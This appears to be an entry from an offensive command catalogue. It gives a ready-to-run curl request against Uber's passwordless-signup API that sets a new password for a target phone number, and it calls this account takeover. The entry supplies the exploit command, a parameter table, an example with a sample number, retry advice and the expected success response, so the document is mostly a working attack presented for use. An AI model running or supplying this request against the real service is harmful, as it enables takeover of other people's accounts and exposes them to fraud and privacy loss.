---
id: e74346d7-82c4-4d6a-b422-bd659d9c21e8
name: uber-passwordless-signup-reset
type: command
executor: bash
data: >-
  curl -X POST https://cn-geo1.uber.com/rt/users/passwordless-signup -H
  "User-Agent: client/iphone/2.137.1" -H "Connection: close" -H "Content-Type:
  application/json" -d
  '{"phoneNumberE164":"+xxxxxxxx","userWorkflow":"PASSWORDLESS_SIGNUP","userRole":"client","mobileCountryISO2":"XX","state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"12345678911a!"}}'
output: >-
  {"phoneNumberE164":"+xxxxxxxx","serverState":"SUCCEEDED","serverStateData":{"nextState":"SIGN_IN"},"tripVerifyStateData":{},"userMessage":"New
  password has been created. Please login with the new
  Password.","userRole":"client","userWorkflow":"PASSWORDLESS_SIGNUP"}
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.404Z'
platforms:
  - Web
tags:
  - api-abuse
  - password-reset
verified: false
validated: true
submitted: true
---

# uber-passwordless-signup-reset

## Command

```bash
curl -X POST https://cn-geo1.uber.com/rt/users/passwordless-signup -H "User-Agent: client/iphone/2.137.1" -H "Connection: close" -H "Content-Type: application/json" -d '{"phoneNumberE164":"+xxxxxxxx","userWorkflow":"PASSWORDLESS_SIGNUP","userRole":"client","mobileCountryISO2":"XX","state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"12345678911a!"}}'
```

## Description

This command sends a POST request to Uber's passwordless signup endpoint to exploit improper authentication by setting a new password for the specified phone number, enabling account takeover.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| phoneNumberE164 | Target phone in E.164 format (e.g., +1xxxxxxxxxx) | Yes |
| userWorkflow | Set to PASSWORDLESS_SIGNUP to invoke vulnerable flow | Yes |
| userRole | 'client' for riders | Yes |
| mobileCountryISO2 | Two-letter country code (e.g., 'US') | Yes |
| state | CREATE_NEW_PASSWORD to trigger reset | Yes |
| newPasswordData.newPassword | Desired new password | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://cn-geo1.uber.com/rt/users/passwordless-signup -H "User-Agent: client/iphone/2.137.1" -H "Content-Type: application/json" -d '{"phoneNumberE164":"+15551234567","userWorkflow":"PASSWORDLESS_SIGNUP","userRole":"client","mobileCountryISO2":"US","state":"CREATE_NEW_PASSWORD","newPasswordData":{"newPassword":"NewPass123!"}}'
```

### Advanced Usage

Retry if first fails:
```bash
# Run twice if needed
curl ... # (same as above)
```

## Expected Output

JSON with serverState: SUCCEEDED, confirming new password set. Full response includes nextState: SIGN_IN and success message.

## Related

- [[Related Procedure: Replay-Uber-Passwordless-Signup-for-Password-Reset]]
